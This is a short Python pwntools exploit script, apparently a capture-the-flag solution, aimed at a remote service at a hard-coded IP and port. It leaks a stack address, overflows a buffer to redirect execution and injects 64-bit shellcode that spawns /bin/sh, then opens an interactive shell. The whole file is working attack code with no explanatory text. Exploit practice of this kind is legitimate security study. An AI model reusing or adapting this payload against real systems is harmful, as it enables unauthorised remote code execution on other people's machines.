from pwn import *

DEBUG = 0

if DEBUG == 1:
    r = remote('127.0.0.1' ,1337)
else:
    r = remote('13.124.134.94', 8888)

shell64 ="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
print len(shell64)

# for gdb debug
raw_input()

# leak stack address
line = r.recvuntil(' > ')
print line
r.sendline("1")
r.sendline("A"*31)

line = r.recvuntil(' > ')

stack_addr = u64(line.split("\n")[1].ljust(8,"\x00"))
print hex(stack_addr)

# write stack address to go to shellcode
r.sendline("1")
r.sendline("A"*56+p64(stack_addr - 0x30)+"A"*0x100)


# write shellcode and exploit code
line = r.recvuntil(' > ')
com = p64(stack_addr - 0x140)[0:6][::-1]+"AAAAA"+shell64[::-1]+"\x90"*(25)
print com

r.sendline("2")
r.sendline(com)

r.interactive()

